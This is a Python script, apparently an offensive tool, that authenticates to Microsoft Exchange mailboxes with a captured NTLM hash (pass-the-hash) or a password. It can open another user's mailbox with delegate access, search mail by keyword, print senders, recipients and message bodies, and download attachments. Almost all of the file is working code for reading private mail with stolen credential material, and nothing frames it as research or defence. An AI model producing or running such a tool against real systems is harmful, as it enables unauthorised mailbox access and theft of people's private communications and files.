# Read Email With NTLM Hash

import sys
from optparse import OptionParser
from exchangelib import Account, Credentials, Configuration, FileAttachment, DELEGATE

AutoDownload = False

def EmailAccountAuthByNtlmHash(username, ntlmhash, email, server=None, flag=True):
    try:
        if flag:
            hash = ntlmhash if ntlmhash.find(":") > 0 else "00000000000000000000000000000000:%s"%str(ntlmhash)
            print("[+] Account: %s NTLM: %s"%(str(username), str(hash)))
        else:
            hash = ntlmhash
    except Exception as hashexception:
        print("[-] Invalid NTLM Hash")
        raise hashexception
    try:
        credentials = Credentials(username, hash)
    except Exception as credexception:
        print("[-] Unable to create Credential object")
        raise credexception
    try:
        if server == None:
            email = Account(email, credentials=credentials, autodiscover=True)
            print("[+] Successfully Authenticated")
            return email
        else:
            cre = Credentials(username, hash)
            config = Configuration(server=server, credentials=cre)
            email = Account(primary_smtp_address=email, config=config,
                            autodiscover=False, access_type=DELEGATE)
            return email
    except Exception as error:
        print(error)
        print("[+] Failed Authentication")
        return None

def GetInboxFolder(email):
    try:
        inbox = email.inbox
        print("[+] Successfully obtained Inbox")
        return inbox
    except Exception as error:
        print("[-] Failed to obtain Inbox")
        return None

def SearchKeyword(keyword, email):
    try:
        if str(email.sender.email_address).find(keyword) >= 0:
            return True
    except Exception as reason:
        pass
    try:
        if email.subject.find(keyword) >= 0:
            return True
    except Exception as reason:
        pass
    try:
        if email.text_body.find(keyword) >= 0:
            return True
    except Exception as reason:
        pass
    try:
        for attachment in email.attachments:
            if attachment.name.find(keyword) >= 0:
                return True
        return False
    except Exception as reason:
        pass

def ListAllFloder(email):
    print("[+] List all Folders")
    print(email.root.tree())

def GetOtherFloder(email, floder):
    target = email.root.glob(floder+"*")
    print("[+] Successfully obtained Folder: %s"%str(floder))
    if target.folders == []:
        target = email.root.glob("*/"+floder)
        if target.folders == []:
            target = email.root.glob("**/"+floder)
            if target.folders == []:
                return None
    return target


def GetEmail(floder, count):
    emails = floder.all().order_by("-datetime_received")[:count]
    return emails

def GetEmailByPage(floder, size, page):
    start = 0
    pages = []
    total = 0
    if floder.name == "Inbox":
        total = floder.total_count
    else:
        total = floder.folders[0].total_count
    for index in range(page):
        if start + size < total:
            pages.append(floder.all().order_by("-datetime_received")[start:start+size])
            start += size
        else:
            pages.append(floder.all().order_by("-datetime_received")[start:floder.total_count])
            break
    return pages

def DownloadAttachment(attachment, filename):
    with open(filename, "wb") as fw:
        fw.write(attachment.content)
        print("Attachment: %s, Download Complete: %s"%(attachment.name, filename))

def DisplayEmail(emails, keyword=None):
    for item in emails:
        if keyword != None and keyword not in [""," "]:
            if not SearchKeyword(keyword, item):
                continue
        print("***************************************************************")
        #print(dir(item.id_from_xml))
        print("Email ID: %s"%str(item.id))
        print("Sender: %s(%s)"%(str(item.sender.name), str(item.sender.email_address)))
        if item.cc_recipients != None:
            ccp = "CC:"
            for person in item.cc_recipients:
                ccp += " %s(%s);"%(str(person.name), str(person.email_address))
            print(ccp)
        if item.bcc_recipients != None:
            bccp = "BCC:"
            for person in item.bcc_recipients:
                bccp += " %s(%s);"%(str(person.name), str(person.email_address))
            print(bccp)
        print("Subject: %s"%str(item.subject))
        print("Time: %s"%str(item.datetime_received))
        print("Body:\n%s"%str(item.text_body))
        for attachment in item.attachments:
            if isinstance(attachment, FileAttachment):
                filename = str(item.id) + attachment.name
                print("Attachments: %s"%str(attachment.name))
                if AutoDownload:
                    DownloadAttachment(attachment, filename)
        print("***************************************************************")



if __name__ == "__main__":
    parser = OptionParser()
    parser.add_option("-u", "--user", dest="user", help="Please Input Username: Domain\\DomainUserName!")
    parser.add_option("-H", "--hash", dest="hash", help="Please Input Ntlmhash: xx:xx Or xxxx!")
    parser.add_option("-p", "--pswd", dest="pswd", help="Please Input Password!")
    parser.add_option("-e", "--email", dest="email", help="Please Input Email Address!")
    parser.add_option("-c", "--count", dest="count", help="Please Input How Many Emails You Want To Read!")
    parser.add_option("-s", "--server", dest="server", help="Please Input Email Server Address!")
    parser.add_option("-k", "--keyword", dest="keyword", help="Please Input keyword To Search!")
    parser.add_option("-L", "--List", dest="List", action="store_true", default=False, help="List All Email Floders!")
    parser.add_option("-D", "--download", dest="download", action="store_true", default=False, help="Whether Download Attachment Files Or Not!")
    parser.add_option("-d", "--display", dest="display", action="store_true",help="Show All Email Floders!")
    parser.add_option("-l", "--list", dest="list", action="store_true",help="List All Email Floders!")
    parser.add_option("-f", "--folder", dest="floder", help="Please Input Email Floder Name!")
    (options, args) = parser.parse_args()
    #print(repr(options.keyword))
    if options.download:
        AutoDownload = True
    if options.server == None:
        if options.pswd != None and options.hash == None:
            email = EmailAccountAuthByNtlmHash(options.user, options.pswd, options.email, flag=False)
        else:
            email = EmailAccountAuthByNtlmHash(options.user, options.hash, options.email)
        if email == None:
            exit(0)
    else:
        if options.pswd != None and options.hash == None:
            email = EmailAccountAuthByNtlmHash(options.user, options.pswd, options.email, options.server, flag=False)
        else:
            email = EmailAccountAuthByNtlmHash(options.user, options.hash, options.email, options.server)
        if email == None:
            exit(0)
    if options.List == True:
        ListAllFloder(email)
        sys.exit(0)
    if options.floder != None:
        floder = GetOtherFloder(email, options.floder)
    else:
        floder = GetInboxFolder(email)
    if int(options.count) > 20:
        size = 10
        pagecount = int(options.count)/size + 1 if int(options.count)%size != 0 else int(options.count)/size + 1
        pages = GetEmailByPage(floder, size, int(pagecount))
        for page in pages:
            DisplayEmail(page, options.keyword)
    else:
        emails = GetEmail(floder, int(options.count))
        DisplayEmail(emails, options.keyword)
